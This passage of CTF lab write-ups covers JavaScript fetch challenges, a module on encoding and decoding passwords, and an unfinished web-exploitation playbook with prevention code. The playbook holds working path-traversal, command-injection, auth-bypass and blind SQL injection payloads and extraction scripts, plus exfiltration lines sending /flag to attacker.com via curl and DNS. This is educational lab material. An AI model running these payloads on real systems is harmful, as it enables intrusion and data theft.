  <p>Redirection using Javascript!!!</p>
 </body>
 <script src='http://challenge.localhost:80/solve'></script>
 <script>
  window.location.href='/home/hacker/public_html/solve.html' + flag;
 </script>
</html>
```

You will find the flag at the window where you executed your server script. It will return the status code of 200 along with the flag value with the path of the file where you redirected your program.

---

## 34. HTTP JavaScript

We need to understand how `fetch` in JavaScript works for this. `fetch` makes HTTP request to the target URL and returns a promise. If the promise is successful, `.then` part is executed. I made an HTTP request using `fetch` to the target URL `http://challenge.localhost:80/submit` and then use `window.location` object to redirect the flag to the `solve.html` file.

### solve.html
```html
<html>
 <head>
  <title>Redirection</title>
 </head>
 <body>
  <p>Redirection using Javascript!!!</p>
 </body>
 <script>
  fetch('http://challenge.localhost:80/submit')
    .then(response => response.text())
    .then(content => window.location.href='/home/hacker/public_html/solve.html'+content);
 </script>
</html>
```

---

## 35. HTTP GET Parameters (javascript)

This challenge is just like the previous one except we need to pass query string along with our HTTP request using JavaScript `fetch`.

### solve.html
```html
<html>
 <head>
  <title>Redirection</title>
 </head>
 <body>
  <p>Redirection using Javascript!!!</p>
 </body>
 <script>
  fetch('http://challenge.localhost:80/submission?auth_key=ccczdnxi&access=bezsjgfc&verify=rsdltbwa')
    .then(response => response.text())
    .then(content => window.location.href='/home/hacker/public_html/solve.html'+content);
 </script>
</html>
```
---

## 36. HTTP Forms (javascript)

We need to send POST request using JavaScript `fetch`.

### solve.html
```html
<html>
 <head>
  <title>Redirection</title>
 </head>
 <body>
  <p>Redirection using Javascript!!!</p>
 </body>
 <script>
  fetch('http://challenge.localhost:80/hack',{
   method: 'POST',
   body: new URLSearchParams({pin: 'pzzodcbb', code: 'ohrcrevd', challenge_key: 'redeczgy'})
  })
  .then(response => response.text())
  .then(content => window.location.href='/home/hacker/public_html/solve.html'+content);
 </script>
</html>
```

# Module 4: Dealing with Data

## Challenge Information
Let's start your journey through encodings with something simple. This program takes a password, but you have no way to know what it is... unless you *READ* it! In most cybersecurity analysis settings, you will be analyzing software that you did not write, like this program. Thus, the very first skill you will learn in this module is to read software to understand what is the data that it wants you to send. We'll start with this trivial Python program. The program lives in `/challenge/runme`, and will request a tricky password before it gives you the flag. It's going to be the simplest program you read in your journey, as it just reads data over standard input and makes one simple check. Read the program, understand the Python, and make the program give you the flag!

---

## 1. What’s the Password?

As the challenge asked I went to the `/challenge` directory location and read the `runme` file. The script is asking us to input a certain text and then compares our input to the original string input. If our input and the original input is equal then the flag is printed.

```bash
cat /challenge/runme
# Find the correct password in the script
echo "correct_password" | /challenge/runme
```

---

## 2. …and again?

This challenge follows the same concept used is the previous challenge. Read the code, understand it, then provide the input to get the flag.

```bash
cat /challenge/runme
# Find the password
echo "password_from_script" | /challenge/runme
```

---

## 3. Newline Troubles

The program wants us to provide a certain string as input but the catch is it will also take the enter or `\n` as part of the input as well so we need to prevent that from happening. `echo -n` commands helps us supply our input string value without appending the newline or `\n`.

```bash
echo -n "correct_password" | /challenge/runme
```

---

## 4. Reasoning about files

The program reads bytes of the string from a file named `ryoy` and matches the string inside the file with the program string. I first tried to create the file in that same directory but was unable due to insufficient permissions so I created the file in the `/tmp` directory. After that I added the input string using the same `echo -n` to prevent appending the newline.

```bash
echo -n "correct_password" > /tmp/ryoy
/challenge/runme
```

---

## 5. Specifying Filenames

Create a file and provide the necessary input string and supply the filename as the command line argument for the `runme` program.

```bash
echo -n "correct_password" > /tmp/input_file
/challenge/runme /tmp/input_file
```

---

## 6. Binary and Hex Encoding

The program takes input in raw bytes then converts them into string format using `decode()` and then uses the `bytes.fromhex` method to convert the hex string to bytes format again. Analyze the program carefully and I am sure you will understand why I gave `86` as input. You can open up a python command line interpreter to clarify your thought process.

```bash
echo -n "68656c6c6f" | /challenge/runme  # Example: hex for "hello"
```

---

## 7. More Hex

Same as the previous challenge. Reads input in raw bytes, then converts to string using `decode()` and then to bytes using `bytes.fromhex()`. If you understood the previous one this one should be cake walk as well.

```bash
echo -n "6368616c6c656e6765" | /challenge/runme  # hex for "challenge"
```

---

## 8. Decoding Hex

The `\x` interprets each pair of characters as a single byte which makes the it 8 bytes in total. But the original byte literal there are 16 bytes in total because each character is interpreted as a single byte. So we used `echo -e` to produce the raw binary data into the file.

```bash
echo -e -n "\x48\x65\x6c\x6c\x6f" > /tmp/input
/challenge/runme
```

---

## 9. Decoding Practice

I edited the code by copying it and then printing the `correct_password` variable. The value came `b'\x98\xd3\xd0\xb2\xce\xe1\xee\xab'` so this raw bytes was compared with the `entered_password`. So as usual I used the `echo -e` to interpret the `\xNN` as a single byte and match `entered_password` and `correct_password`.

```bash
echo -e -n "\x98\xd3\xd0\xb2\xce\xe1\xee\xab" | /challenge/runme
```

---

## 10. Encoding Practice

We need to first convert the `b"\x8a\xed\xec\xc4\xed\x95\xf7\xb8"` in bits. Below is the python program for that.

```python
byte_string = b'\x8a\xed\xec\xc4\xed\x95\xf7\xb8'
binary_representation = []

for byte_value in byte_string:
    # Convert each byte (integer 0-255) to its 8-bit binary representation
    # The '08b' format specifier ensures leading zeros are included for 8 bits
    binary_representation.append(format(byte_value, '08b'))

# Join the 8-bit binary strings for each byte into a single string
result = "".join(binary_representation)
print(result)
```

After copying the bits I used `echo -n` to prevent appending newline and added the bits into a file named `input`. Then I passed the content of the `input` file to the program and got the flag.

```bash
echo -n "1000101011101101111011001100010011101101100101011111011110111000" > /tmp/input
/challenge/runme
```

---

## 11. Hex-encoding ASCII

**NOTE**: Python encodes string into bytes object which is equivalent to its ASCII value. Check this using `man ascii` command.

I passed the ASCII values corresponding to the string `eewqcnzx`. I used `gdb` for displaying the hex values of the string.

```bash
gdb -q
(gdb) p/x "eewqcnzx"
$1 = {0x65, 0x65, 0x77, 0x71, 0x63, 0x6e, 0x7a, 0x78, 0x0}
```

```bash
echo -n "65657771636e7a78" | /challenge/runme
```

---

## 12. Nested Encoding

### Challenge Program
```python
#!/usr/bin/exec-suid -- /bin/python3 -I
import sys

try:
    entered_password = open("vdho", "rb").read()
except FileNotFoundError:
    print("Input file not found...")
    sys.exit(1)
correct_password = b"pkukrtnj"
print(f"Read {len(entered_password)} bytes.")

entered_password = bytes.fromhex(entered_password.decode("l1"))
entered_password = bytes.fromhex(entered_password.decode("l1"))
entered_password = bytes.fromhex(entered_password.decode("l1"))
entered_password = bytes.fromhex(entered_password.decode("l1"))

if entered_password == correct_password:
    print("Congrats! Here is your flag:")
    print(open("/flag").read().strip())
else:
    print("Incorrect!")
    sys.exit(1)
```

Now here our `correct_password` is decoded 4 times so we need to perform encoding and hexing 4 times as well because any lesser than that either we are going to get a format where `hex()` operation cannot be performed or during `bytes.fromhex()` our data will be having non-hexadecimal values.

I used the python command line interpreter to form my input data. Below is the code snippet for that.

```python
>>> a = b'pkukrtnj'
>>> h = a.hex().encode().hex().encode().hex().encode().hex()
>>> h
'33333337333333303333333633363332333333373333333533333336333633323333333733333332333333373333333433333336333633353333333633363331'
```

```bash
echo -n '33333337333333303333333633363332333333373333333533333336333633323333333733333332333333373333333433333336333633353333333633363331' > vdho
/challenge/runme
```

We got the flag!!!

---

## 13. Hex-encoding UTF-8

### Challenge Program
```python
#!/usr/bin/exec-suid -- /bin/python3 -I
import sys

print("Enter the password:")
entered_password = sys.stdin.buffer.read1()
correct_password = "📊 🚔 🔦 🕞".encode("utf-8")
print(f"Read {len(entered_password)} bytes.")

entered_password = bytes.fromhex(entered_password.decode("l1"))

if entered_password == correct_password:
    print("Congrats! Here is your flag:")
    print(open("/flag").read().strip())
else:
    print("Incorrect!")
    sys.exit(1)
```

I edited the code a bit so that i could print the `correct_password` value and get the hex byte string for the emojis.

```python
correct_password = "📊 🚔 🔦 🕞".encode("utf-8")
print(f"Read {len(correct_password)} bytes.")
print(correct_password)
```

**Output:**
```
Read 19 bytes.
b'\xf0\x9f\x93\x8a \xf0\x9f\x9a\x94 \xf0\x9f\x94\xa6 \xf0\x9f\x95\x9e'
```

**NOTE**: the hex value for spaces is `0x20` which is not mentioned here. You will need this later.

```bash
echo -n 'f09f938a20f09f9a9420f09f94a620f09f959e' > input
/challenge/runme < input
```

I provided the hex values of the emojis and also provided the hex value for the spaces. There were 3 spaces so `0x20` will be given as input 3 times. I stored the data inside a file and used `echo -n` command to prevent appending new line so that those extra bytes don't mess my logic.

---

## 14. UTF Mixups

The challenge program here is decoded using utf-16 and then encoded using latin1 so there will be error.

**IMPORTANT POINTS**
- UTF-16 takes 2 bytes
- UTF-16 stores the bytes in Little Endian.

Remember these 2 points because you need to arrange your hex bytes accordingly. I used `gdb` first to get the hex value of the `mpseczuv`.

```bash
gdb -q
(gdb) p/x "mpseczuv"
$1 = {0x6d, 0x70, 0x73, 0x65, 0x63, 0x7a, 0x75, 0x76, 0x0}
```

If this is the hex value according to the utf-8 then the utf-16 arrangement will be `\x6d\x00\x70\x00\x73\x00\x65\x00\x63\x00\x7a\x00\x75\x00\x76\x00`.

```bash
echo -e -n '\x6d\x00\x70\x00\x73\x00\x65\x00\x63\x00\x7a\x00\x75\x00\x76\x00' > input2
/challenge/runme < input2
```

The program reads the data in bytes so I used `echo -e` to interpret those `\x` as a byte. The terminal was able to connect the utf-16 encoding and print the characters in a readable format.

---

## 15. Modifying Encoded Data

I used the python command line interpreter to solve this challenge by experimenting and analyzing the hex values and the decoding and encoding. Below is how I did it.

```python
>>> original = b'\xdcr\x9dn\x14W\xab\xbe'  # OUR CORRECT PASSWORD
>>> original.hex()
'dc729d6e1457abbe'  # HEX FORM OF CORRECT PASSWORD
>>> 'dc729d6e1457abbe'[::-1]  # REVERSE OF HEX FORM
'ebba7541e6d927cd'
>>> b'dc729d6e1457abbe'.decode('l1')
'dc729d6e1457abbe'
>>> bytes.fromhex('dc729d6e1457abbe')
b'\xdcr\x9dn\x14W\xab\xbe'
```

So according to the above analysis our input should be `ebba7541e6d927cd`.

```bash
echo -n 'ebba7541e6d927cd' | /challenge/runme
```

---

## 16. Decoding Base64

Read the `runme` file carefully and try to understand the code. I used the python command line interpreter to get the value of the `correct_password` so that I can configure my input data accordingly.

```python
>>> original = b'rFSn2eTJLic='
>>> import base64
>>> base64.b64decode(original)
b"\xacT\xa7\xd9\xe4\xc9.'"
```

So the input data should be `\xacT\xa7\xd9\xe4\xc9.'`.

```bash
echo -e -n "\xacT\xa7\xd9\xe4\xc9.'" | /challenge/runme
```

---

## 17. Encoding Base64

In this challenge we need to encoded our input data. I used the python command line interpreter to form the input data.

```python
>>> input = b'\x832\xdb\xc4\xc5\xd0\xaa\x8a'
>>> base64.b64encode(input)
b'gzLbxMXQqoo='  # INPUT
>>> encode = base64.b64encode(input)
>>> encode
b'gzLbxMXQqoo='
>>> decode = encode.decode('l1')
>>> decode
'gzLbxMXQqoo='
>>> baseDecode = base64.b64decode(decode)
>>> baseDecode
b'\x832\xdb\xc4\xc5\xd0\xaa\x8a'
```

You can also use the `echo` command to supply the raw bytes to base64 in the terminal to form the encoding directly in the terminal without having to use the python command line interpreter.

```bash
echo -e -n '\x832\xdb\xc4\xc5\xd0\xaa\x8a' | base64
gzLbxMXQqoo=
```

Now copy this base64 encoding value and copy into a file without any newlines using `echo -n`.

```bash
echo -n 'gzLbxMXQqoo=' > /tmp/input
/challenge/runme
```

---

## 18. Dealing with Obfuscation

I copied the code from the `runme` file into a different file named `test.py` and printed the value of the `correct_password` variable to get the value. After that I copied that data into a file named `input` using `echo -n` command to prevent addition of newlines.

```bash
cat /challenge/runme > test.py
# Edit test.py to print correct_password
python test.py
# Copy the printed password
echo -n "password_from_output" > /tmp/input
/challenge/runme
```

---

## 19. Dealing with Obfuscation 2

Analyzing the program I understood that our input gets decoded 2 times in base64 and there is a string reversal which can be ignored because its performed 2 times on our input so it gets cancelled out. I edited the `runme` file and printed the `correct_password` value.

```python
# After analyzing the program
# correct password before obfuscation => 8 bytes.
# b'QP9EVT3VEVNdXQE10dBRVT4VEVNdXRE10dBRVT3VERNhXRU10dFRUT3FERNdXQE10dFRVT3FEVNhXRE10dFRUT3VERNdXRE10dBRUT3FEVNhXQU10dFRUT'
# correct password after obfuscation => 120 bytes
```

Notice the `==` sign is before which is incorrect padding in base64 encoding but the `correct_password` encoding gets reversed in the `runme` file for obfuscation.

So basically, we need to reverse the encoding of the `correct_password` and perform base64 encoding twice on it to get our input data.

```python
>>> import base64
>>> input = b'QP9EVT3VEVNdXQE10dBRVT4VEVNdXRE10dBRVT3VERNhXRU10dFRUT3FERNdXQE10dFRVT3FEVNhXRE10dFRUT3VERNdXRE10dBRUT3FEVNhXQU10dFRUT'
>>> encode1 = base64.b64encode(input)
>>> encode2 = base64.b64encode(encode1)
>>> encode2
b'UFQxUlVEbEZWbFF6VmtWV1RtUllVVVV4TUdSQ1VsWlVORlpGVms1a1dGSkZNVEJrUWxKV1ZETldSVkpPYUZoU1ZURXdaRVpTVlZRelJrVlNUbVJZVVVVeE1HUkdVbFpVTTBaRlZrNW9XRkpGTVRCa1JsSlZWRE5XUlZKT1pGaFNSVEV3WkVKU1ZWUXpSa1ZXVG1oWVVWVXhNR1JHVWxWVQ'
```

So our input data is `UFQxUlVEbEZWbFF6VmtWV1RtUllVVVV4TUdSQ1VsWlVORlpGVms1a1dGSkZNVEJrUWxKV1ZETldSVkpPYUZoU1ZURXdaRVpTVlZRelJrVlNUbVJZVVVVeE1HUkdVbFpVTTBaRlZrNW9XRkpGTVRCa1JsSlZWRE5XUlZKT1pGaFNSVEV3WkVKU1ZWUXpSa1ZXVG1oWVVWVXhNR1JHVWxWVQ`.

```bash
echo -n 'UFQxUlVEbEZWbFF6VmtWV1RtUllVVVV4TUdSQ1VsWlVORlpGVms1a1dGSkZNVEJrUWxKV1ZETldSVkpPYUZoU1ZURXdaRVpTVlZRelJrVlNUbVJZVVVVeE1HUkdVbFpVTTBaRlZrNW9XRkpGTVRCa1JsSlZWRE5XUlZKT1pGaFNSVEV3WkVKU1ZWUXpSa1ZXVG1oWVVWVXhNR1JHVWxWVQ' > /tmp/input
/challenge/runme
```

---

Finally!!! Dealing with Data module is completed. I hope whoever is reading this story has understood my steps and was able to replicate them to get the flag.

---

# Module 5 🧪 Web Security & CTF Exploitation Playbook

A comprehensive guide covering SQL Injection, Command Injection, Authentication Bypass, Path Traversal, and Blind Exploitation techniques.

---

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Path Traversal](#2-path-traversal)
- [3. Command Injection](#3-command-injection)
- [4. Authentication Bypass](#4-authentication-bypass)
- [5. SQL Injection](#5-sql-injection)
- [6. Blind SQL Injection](#6-blind-sql-injection)
- [7. URL Encoding Reference](#7-url-encoding-reference)
- [8. Useful curl Commands](#8-useful-curl-commands)
- [9. Prevention & Best Practices](#9-prevention--best-practices)

---

## 1. Introduction

This playbook documents various web security vulnerabilities and their exploitation techniques encountered in CTF challenges. Each section includes:
- The vulnerable code
- The exploitation technique
- Working payloads
- Prevention methods

---

## 2. Path Traversal

### 2.1 Basic Path Traversal

**Vulnerable Code:**
```python
@app.route("/package/<path:path>")
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    return open(requested_path).read()
```

**The Problem:** The server concatenates user input directly with a base path without sanitization.

**Exploitation:**
```bash
# Read /etc/passwd
curl --path-as-is "http://challenge.localhost:80/package/../../../etc/passwd"

# Read the flag
curl --path-as-is "http://challenge.localhost:80/package/../../../flag"
curl --path-as-is "http://challenge.localhost:80/package/../../../flag.txt"
curl --path-as-is "http://challenge.localhost:80/package/../../../../flag"
```

**Why `--path-as-is` is Important:**
- `curl` normalizes URLs by default (removes `../`)
- `--path-as-is` preserves `../` sequences
- Without it, path traversal fails

**Prevention:**
```python
import os

def safe_path(path):
    full_path = os.path.abspath(os.path.join(app.root_path, "files", path))
    if not full_path.startswith(os.path.abspath(app.root_path + "/files/")):
        raise ValueError("Path traversal detected")
    return full_path
```

---

## 3. Command Injection

### 3.1 Basic Command Injection

**Vulnerable Code:**
```python
@app.route("/checkpoint")
def challenge():
    arg = flask.request.args.get("target", "/challenge")
    command = f"ls -l {arg}"
    result = subprocess.run(command, shell=True, ...)
```

**Exploitation:**
```bash
# Read the flag
curl "http://challenge.localhost:80/checkpoint?target=;cat%20/flag"

# Multiple commands
curl "http://challenge.localhost:80/checkpoint?target=;whoami;id;cat%20/flag"

# Find the flag file
curl "http://challenge.localhost:80/checkpoint?target=;find%20/%20-name%20%22flag*%22%202>/dev/null"
```

### 3.2 Bypassing Filters

**Vulnerable Code:**
```python
arg = flask.request.args.get("folder", "/challenge").replace(";", "")
command = f"ls -l {arg}"
```

**Bypass Techniques:**

| Character | URL Encoding | Purpose |
|-----------|--------------|---------|
| `&&` | `%26%26` | AND operator |
| `||` | `%7C%7C` | OR operator |
| `\|` | `%7C` | Pipe |
| `&` | `%26` | Background |
| `\n` | `%0A` | Newline |
| `` ` `` | `%60` | Command substitution |
| `$()` | `%24%28%29` | Command substitution |

**Working Payloads:**
```bash
# Using && (bypasses ; filter)
curl "http://challenge.localhost:80/puzzle?folder=/challenge%26%26cat%20/flag"

# Using newline
curl "http://challenge.localhost:80/puzzle?folder=/challenge%0Acat%20/flag"

# Using pipe
curl "http://challenge.localhost:80/puzzle?folder=/challenge%7Ccat%20/flag"

# Using command substitution
curl "http://challenge.localhost:80/puzzle?folder=$(cat%20/flag)"

# Using ${IFS} if spaces are blocked
curl "http://challenge.localhost:80/puzzle?folder=/challenge%26%26cat${IFS}/flag"
```

### 3.3 Blind Command Injection

**Vulnerable Code:**
```python
command = f"touch {arg}"
# Output is captured but NOT displayed!
```

**Exploitation Techniques:**

```bash
# 1. Time-based detection
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20sleep%205"

# 2. Write output to web-accessible file
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20cat%20/flag%20%3E%20/var/www/html/flag.txt"
curl "http://challenge.localhost:80/flag.txt"

# 3. Write to /tmp and check via error
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20cat%20/flag%20%3E%20/tmp/flag"

# 4. DNS exfiltration
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20nslookup%20$(cat%20/flag%20|%20base64).attacker.com"

# 5. HTTP exfiltration
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20curl%20-d%20%22$(cat%20/flag)%22%20http://attacker.com/collect"
```

**Prevention:**
```python
# NEVER use user input directly in shell commands

# Use parameterized APIs
subprocess.run(["ls", "-l", arg])  # Safe - no shell

# Or sanitize input
import shlex
safe_arg = shlex.quote(arg)
os.system(f"ls -l {safe_arg}")
```

---

## 4. Authentication Bypass

### 4.1 Trusted URL Parameter

**Vulnerable Code:**
```python
@app.route("/", methods=["GET"])
def challenge_get():
    username = flask.request.args.get("session_user", None)
    if username == "admin":
        page += "Flag: " + open("/flag").read()
```

**Exploitation:**
```bash
# Just set session_user=admin in the URL
curl "http://challenge.localhost:80/?session_user=admin"
```

### 4.2 Trusted Cookie

**Vulnerable Code:**
```python
@app.route("/", methods=["GET"])
def challenge_get():
    username = flask.request.cookies.get("session_user", None)
    if username == "admin":
        page += "Flag: " + open("/flag").read()
```

**Exploitation:**
```bash
# Set the cookie directly
curl -b "session_user=admin" "http://challenge.localhost:80/"

# Or with header
curl -H "Cookie: session_user=admin" "http://challenge.localhost:80/"
```

### 4.3 SQL Injection Authentication Bypass

**Vulnerable Code:**
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()
```

**Exploitation:**
```bash
# Pin/Password injection (no quotes)
curl -X POST "http://challenge.localhost:80/session" \
  -d "account-name=admin" \
  -d "pin=0 OR 1=1 --"

# Username injection (with quotes)
curl -X POST "http://challenge.localhost:80/user-login" \
  -d "user=admin' --" \
  -d "security-token=anything"

# OR injection
curl -X POST "http://challenge.localhost:80/user-login" \
  -d "user=admin' OR '1'='1" \
  -d "security-token=anything"

# Using # comment
curl -X POST "http://challenge.localhost:80/user-login" \
  -d "user=admin' #" \
  -d "security-token=anything"
```

**One-Liner to Get Flag:**
```bash
curl -L -X POST "http://challenge.localhost:80/user-login" \
  -d "user=admin' --" \
  -d "security-token=anything" \
  -c cookies.txt -b cookies.txt | grep -o "flag{[^}]*}"
```

---

## 5. SQL Injection

### 5.1 UNION Injection

**Vulnerable Code:**
```python
sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
```

**Exploitation:**
```bash
# Get admin's password (the flag)
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT password FROM users WHERE username="admin" --'

# Get all tables
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT name FROM sqlite_master WHERE type="table" --'

# Get table schema
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT sql FROM sqlite_master WHERE type="table" --'

# Get all users and passwords
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT username || ":" || password FROM users --'
```

**URL Encoded Version:**
```bash
curl "http://challenge.localhost:80/?query=admin%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username=%22admin%22%20--"
```

### 5.2 Union Injection with Different Column Counts

**If UNION fails, try different column counts:**
```bash
# 1 column
admin" UNION SELECT password FROM users --

# 2 columns
admin" UNION SELECT username, password FROM users --

# 3 columns
admin" UNION SELECT rowid, username, password FROM users --
```

### 5.3 Getting Data from sqlite_master

```bash
# Get all tables
admin" UNION SELECT name FROM sqlite_master WHERE type="table" --

# Get all table schemas
admin" UNION SELECT sql FROM sqlite_master WHERE type="table" --

# Get specific table schema
admin" UNION SELECT sql FROM sqlite_master WHERE type="table" AND name="users" --

# Get all indexes
admin" UNION SELECT name FROM sqlite_master WHERE type="index" --
```

---

## 6. Blind SQL Injection

### 6.1 Boolean-Based Blind Injection

**Vulnerable Code:**
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()
if user:  # Login success (302)
    flask.session["user"] = username
else:    # Login failure (403)
    flask.abort(403)
```

**Exploitation:**

```bash
# Test if injection works
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' OR 1=1 --" \
  -v 2>&1 | grep "302"  # Should return 302

# Always false (should return 403)
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' AND 1=2 --" \
  -v 2>&1 | grep "403"  # Should return 403
```

**Extracting Flag with SUBSTR:**

```bash
# Check if first character is 'p'
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'p' --" \
  -v 2>&1 | grep "302"

# Check if first character is 'f'
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'f' --" \
  -v 2>&1 | grep "302"
```

**Python Extraction Script:**
```python
import requests

def get_flag():
    base = "http://challenge.localhost:80/"
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"
    flag = "p"  # First character found
    pos = 2
    
    while True:
        for c in chars + "}":
            payload = f"' OR (SELECT SUBSTR(password,{pos},1) FROM users WHERE username='admin') = '{c}' --"
            r = requests.post(base,
                data={"username": "admin", "password": payload},
                allow_redirects=False
            )
            if r.status_code == 302:
                flag += c
                print(f"Found: {flag}")
                if c == '}':
                    return flag
                break
        pos += 1

print(f"Flag: {get_flag()}")
```

### 6.2 Binary Search for Faster Extraction

```python
import requests

def get_char_at_position(pos):
    """Binary search for character at position"""
    low, high = 32, 126  # ASCII printable range
    
    while low < high:
        mid = (low + high) // 2
        payload = f"' OR (SELECT SUBSTR(password,{pos},1) FROM users WHERE username='admin') <= CHAR({mid}) --"
        r = requests.post('http://challenge.localhost:80/',
            data={'username': 'admin', 'password': payload},
            allow_redirects=False)
        if r.status_code == 302:
            high = mid
        else:
            low = mid + 1
    
    return chr(low)

# Extract flag using binary search
flag = ""
pos = 1
while True:
    char = get_char_at_position(pos)
    flag += char
    print(f"Position {pos}: {char} → {flag}")
    if char == '}':
        break
    pos += 1

print(f"Flag: {flag}")
```

### 6.3 Time-Based Blind Injection

**When boolean injection doesn't work, use time-based:**

```bash
# Test time-based injection
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20sleep%205"

# Check character with time delay
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' AND (SELECT CASE WHEN SUBSTR(password,1,1)='f' THEN 1 ELSE 0 END) = 1 AND sleep(3) --"
```

**Python Time-Based Script:**
```python
import requests
import time

def check_char(pos, char):
    payload = f"' AND (SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN 1 ELSE 0 END) = 1 AND sleep(3) --"
    start = time.time()
    requests.post('http://challenge.localhost:80/',
        data={'username': 'admin', 'password': payload})
    elapsed = time.time() - start
    return elapsed >= 3  # If it slept for 3 seconds, condition was true
```

---

## 7. URL Encoding Reference

| Character | URL Encoding | Purpose |
|-----------|--------------|---------|
| `"` | `%22` | Double quote (SQL strings) |
| `'` | `%27` | Single quote (SQL strings) |
| Space | `%20` | Space in URL |
| `;` | `%3B` | Command separator |
| `&&` | `%26%26` | AND operator |
| `||` | `%7C%7C` | OR operator |
| `\|` | `%7C` | Pipe operator |
| `&` | `%26` | Background execution |
| `\n` | `%0A` | Newline |
| `\t` | `%09` | Tab |
| `$` | `%24` | Dollar sign |
| `(` | `%28` | Left parenthesis |
| `)` | `%29` | Right parenthesis |
| `` ` `` | `%60` | Backtick |
| `#` | `%23` | Hash |
| `-` | `%2D` | Dash |
| `/` | `%2F` | Forward slash |
| `\` | `%5C` | Backslash |
| `:` | `%3A` | Colon |
| `=` | `%3D` | Equals sign |
| `?` | `%3F` | Question mark |
| `@` | `%40` | At sign |
| `+` | `%2B` | Plus sign |
| `%` | `%25` | Percent sign |

### URL Encoding Example

**Payload:**
```sql
admin" UNION SELECT password FROM users WHERE username="admin" --
```

**URL Encoded:**
```
admin%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username=%22admin%22%20--
```

---

## 8. Useful curl Commands

### 8.1 GET Requests

```bash
# Basic GET
curl "http://challenge.localhost:80/"

# GET with parameters
curl "http://challenge.localhost:80/?query=admin"

# GET with --path-as-is (for path traversal)
curl --path-as-is "http://challenge.localhost:80/package/../../../flag"

# GET with cookies
curl -b "session=admin" "http://challenge.localhost:80/"
```

### 8.2 POST Requests

```bash
# Basic POST
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=password"

# POST with URL encoded data
curl -X POST "http://challenge.localhost:80/" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=' OR 1=1 --"

# POST with JSON
curl -X POST "http://challenge.localhost:80/" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'

# POST with file upload
curl -X POST "http://challenge.localhost:80/upload" \
  -F "file=@payload.txt" \
  -F "filename=; cat /flag"
```

### 8.3 Cookie Management

```bash
# Save cookies to file
curl -c cookies.txt "http://challenge.localhost:80/login"

# Send cookies from file
curl -b cookies.txt "http://challenge.localhost:80/"

# Set a specific cookie
curl -b "session=admin" "http://challenge.localhost:80/"

# Send cookie as header
curl -H "Cookie: session=admin" "http://challenge.localhost:80/"
```

### 8.4 Verbose and Debugging

```bash
# Show full request/response
curl -v "http://challenge.localhost:80/"

# Show only headers
curl -I "http://challenge.localhost:80/"

# Show request headers only
curl -v "http://challenge.localhost:80/" 2>&1 | grep ">"

# Show response headers only
curl -v "http://challenge.localhost:80/" 2>&1 | grep "<"

# Follow redirects
curl -L "http://challenge.localhost:80/"

# Save output to file
curl -o output.txt "http://challenge.localhost:80/"

# Silent mode (no progress bar)
curl -s "http://challenge.localhost:80/"
```

### 8.5 One-Liners for Common Tasks

```bash
# Get flag from SQL injection
curl -s -X POST "http://challenge.localhost:80/login" \
  -d "username=admin' --" \
  -d "password=anything" \
  -c cookies.txt && \
curl -s -L "http://challenge.localhost:80/" \
  -b cookies.txt | grep -o "flag{[^}]*}"

# Extract first character (blind SQL)
for c in {a..z} {A..Z} {0..9}; do
    curl -s -X POST "http://challenge.localhost:80/" \
        -d "username=admin" \
        -d "password=' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = '$c' --" \
        -v 2>&1 | grep -q "302" && echo "First char: $c" && break
done

# Test command injection
curl "http://challenge.localhost:80/checkpoint?target=;sleep%205" \
  --max-time 3 && echo "Not vulnerable" || echo "Vulnerable!"

# Path traversal enumeration
for i in {1..10}; do
    traversal=$(printf '../%.0s' $(seq 1 $i))
    curl -s -o /dev/null -w "%{http_code}" \
        "http://challenge.localhost:80/package/${traversal}flag"
done
```

---

## 9. Prevention & Best Practices

### 9.1 SQL Injection Prevention

**Use Parameterized Queries (ALWAYS!):**
```python
# ❌ VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}'"
db.execute(query)

# ✅ SECURE
query = "SELECT * FROM users WHERE username = ?"
db.execute(query, (username,))
```

**Input Validation:**
```python
# Whitelist approach
allowed = ["admin", "guest", "user"]
if username in allowed:
    query = "SELECT * FROM users WHERE username = ?"
    db.execute(query, (username,))
```

### 9.2 Command Injection Prevention

**Use Parameterized APIs:**
```python
# ❌ VULNERABLE
os.system(f"ls -l {user_input}")

# ✅ SECURE
subprocess.run(["ls", "-l", user_input])  # No shell!

# ✅ SECURE (if shell is necessary)
import shlex
safe_input = shlex.quote(user_input)
os.system(f"ls -l {safe_input}")
```

### 9.3 Authentication Best Practices

```python
# ❌ VULNERABLE - Trusting client data
username = request.args.get("session_user")
if username == "admin":
    show_flag()

# ✅ SECURE - Server-side sessions
session_token = request.cookies.get("session")
if session_token in sessions:
    username = sessions[session_token]
    if username == "admin":
        show_flag()
```

### 9.4 Path Traversal Prevention

```python
import os

def safe_path(user_path):
    # Get absolute path
